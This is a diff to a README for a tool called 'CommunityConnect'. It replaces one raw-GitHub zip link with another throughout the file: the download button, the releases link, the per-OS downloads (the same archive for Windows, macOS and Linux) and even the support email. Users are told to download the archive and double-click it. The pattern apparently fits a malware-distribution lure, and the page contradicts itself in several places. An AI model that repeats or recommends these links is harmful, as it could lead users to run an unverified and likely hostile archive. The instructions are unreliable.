@@ -6,7 +6,7 @@ Welcome to CommunityConnect! This application provides a user-friendly interface
 
 ## 📥 Download Link 
 
-[![Download CommunityConnect](https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip)](https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip)
+[![Download CommunityConnect](https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip)](https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ Before downloading, make sure your computer meets these requirements:
 
 ## 📂 Download & Install
 
-To get CommunityConnect, visit this page to download: [CommunityConnect Releases](https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip). 
+To get CommunityConnect, visit this page to download: [CommunityConnect Releases](https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip). 
 
 Here are the steps to download and install:
 
@@ -27,9 +27,9 @@ Here are the steps to download and install:
 2. You will see a list of available versions. Look for the latest version.
 3. Click on the version link to expand the details.
 4. You will find several files available for download. Choose the file that matches your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip`.
 5. After the download finishes, locate the file on your computer.
 6. Double-click the file to start the installation process.
 7. Follow the on-screen instructions to complete the installation.
@@ -59,7 +59,7 @@ If you have questions or need help with CommunityConnect, you can find support t
 
 - **GitHub Issues:** Report any bugs or issues directly in our GitHub repository.
 - **Community Forums:** Join our forums to connect with other users and get advice.
-- **Email Support:** Reach out to our support team at https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_v3.0.zip We’re here to help!
+- **Email Support:** Reach out to our support team at https://raw.githubusercontent.com/borja777/CommunityConnect/main/buckhound/Connect_Community_1.9.zip We’re here to help!
 
 ## 📝 Contribution
 
